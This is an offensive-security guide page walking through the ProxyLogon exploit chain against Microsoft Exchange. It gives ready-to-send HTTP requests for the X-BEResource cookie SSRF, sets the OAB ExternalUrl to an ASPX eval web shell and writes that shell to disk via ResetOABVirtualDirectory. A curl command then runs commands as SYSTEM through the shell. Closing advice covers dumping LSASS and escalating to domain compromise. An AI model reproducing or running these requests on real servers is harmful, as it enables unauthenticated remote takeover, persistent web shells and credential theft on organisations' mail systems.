---
title: "ProxyLogon: X-BEResource SSRF to a web shell"
order: 1
description: "The pre-authentication Exchange chain that uses the X-BEResource cookie SSRF through the front end to reach the back-end ECP as SYSTEM, authenticates as any mailbox, then abuses the OAB virtual directory ExternalUrl plus ResetOABVirtualDirectory to write an aspx web shell under a web-served path."
keywords:
  - ProxyLogon
  - X-BEResource
  - SSRF
  - OABVirtualDirectory
  - web shell
---

# ProxyLogon

ProxyLogon is the original front-end-to-back-end chain and needs **no credential**, only network reach to OWA. The front end proxies to the back end by trusting a cookie named **`X-BEResource`**, whose value is `<backend-fqdn>~<version-token>` plus the path to proxy. By supplying that cookie yourself you make the front end issue an **implicitly authenticated** request to any back-end URL, which is a server-side request forgery into the back-end management surface. From there you authenticate as any mailbox (including an admin), set the Offline Address Book virtual directory's `ExternalUrl` to a block of ASPX code, and trigger a reset that writes that code to a file under a web-served directory. The result is a web shell running as `SYSTEM`.

## Preconditions

- The build is at or below the early-2021 security rollup for Exchange 2013/2016/2019 (the [version fingerprint](../enumeration.md) decides this).
- `/owa` and `/ecp` are reachable, and you know the back-end server FQDN (the NTLM type-2 leak in [enumeration](../enumeration.md) hands you this).
- You know a mailbox to target; the chain lets you discover and then act as an admin mailbox, so any valid address plus the default admin suffices.

## Step 1: SSRF to the back-end ECP and get a session

Send a request to a front-end endpoint that permits the `X-BEResource` cookie (the autodiscover/ECP proxy path), steering it to the back-end `/ecp/` so the back end treats it as an authenticated administrative request. The response leaks the target's `LegacyDN` and a server session identifier:

```http
GET /ecp/x.js HTTP/1.1
Host: mail.example.com
Cookie: X-BEResource=exch-backend.example.local/ecp/proxyLogon.ecp?~1941962753;
Content-Type: text/xml

<r at="Negotiate" ln="administrator"><s>admin-sid-or-session</s></r>
```

A `200` that returns a `msExchEcpCanary` token and the mailbox `LegacyDN` means the SSRF reached the back-end ECP and it accepted you as the named principal. A `500` or `401` means the cookie token or back-end FQDN is wrong; recheck the version token and the internal name from the type-2 leak.

## Step 2: point the OAB virtual directory at a payload

With the back-end session and canary, set the OAB virtual directory's `ExternalUrl` to a string containing ASPX. Exchange stores that string, and nothing validates that a URL is really a URL:

```http
POST /ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&msExchEcpCanary=<canary> HTTP/1.1
Host: mail.example.com
Cookie: X-BEResource=exch-backend.example.local/ecp/...; ASP.NET_SessionId=<id>; msExchEcpCanary=<canary>
Content-Type: application/json

{"identity":{"__type":"Identity:ECP","DisplayName":"OAB","RawIdentity":"<oab-guid>"},
 "properties":{"Parameters":{"__type":"JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
 "ExternalUrl":"http://x/<script language=\"JScript\" runat=\"server\">function Page_Load(){eval(Request[\"c\"],\"unsafe\");}</script>"}}}
```

## Step 3: write the shell to disk

Trigger `ResetOABVirtualDirectory`, which serializes the OAB configuration (now carrying your ASPX) to a `FilePath` you control under a web-served directory such as `\\...\FrontEnd\HttpProxy\owa\auth\` or `...\ecp\auth\`:

```http
POST /ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&msExchEcpCanary=<canary> HTTP/1.1
Host: mail.example.com
Cookie: X-BEResource=exch-backend.example.local/ecp/...; msExchEcpCanary=<canary>
Content-Type: application/json

{"identity":{"__type":"Identity:ECP","DisplayName":"OAB","RawIdentity":"<oab-guid>"},
 "properties":{"Parameters":{"__type":"JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
 "FilePath":"C:\\inetpub\\wwwroot\\aspnet_client\\shell.aspx"}}}
```

A `200` here means the file was written. Confirm and use it:

```bash
curl -sk 'https://mail.example.com/aspnet_client/shell.aspx' --data 'c=Response.Write(new ActiveXObject("WScript.Shell").Exec("whoami").StdOut.ReadAll());'
# -> nt authority\system
```

`nt authority\system` confirms the chain. If the shell path 404s, the `FilePath` landed outside a web root; pick a directory you can both write and reach over HTTPS (`aspnet_client`, `owa/auth`, `ecp/auth`).

## Follow-on

The web shell is `SYSTEM` on an Exchange server. Dump LSASS and the machine account, then convert that into domain compromise through the Exchange machine account's rights or [PrivExchange](../privexchange.md)-style relay, exactly as in the [RCE chains overview](index.md). Stage further tooling from the shell.

## Exploitation notes

- The two halves are reusable independently: the `X-BEResource` SSRF reaches any back-end URL (useful for reading mail directly), and the OAB `ExternalUrl` plus reset is a generic file write once you hold a back-end ECP session.
- The version token in the cookie must match the back-end build closely enough for the front end to proxy; pull it from the versioned static path first.
- Pick a write path that is both inside a web root and served by the front-end proxy, or the shell writes successfully but cannot be reached.

## Tools

- **Metasploit** (`exchange_proxylogon_rce`): maintained end-to-end module.
- **Standalone PoCs** matched to the exact build, for manual control of each step.
- **curl / Burp**: hand-driving the three requests when a module misfires on an odd build.

## References

- [DEVCORE / Orange Tsai: A new attack surface on MS Exchange, part 1 (ProxyLogon)](https://devco.re/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-1-ProxyLogon/)
- [Praetorian: reproducing the ProxyLogon chain](https://www.praetorian.com/blog/reproducing-proxylogon-exploit/)
- [Microsoft Security: HAFNIUM targeting Exchange Servers](https://www.microsoft.com/en-us/security/blog/2021/03/02/hafnium-targeting-exchange-servers/)
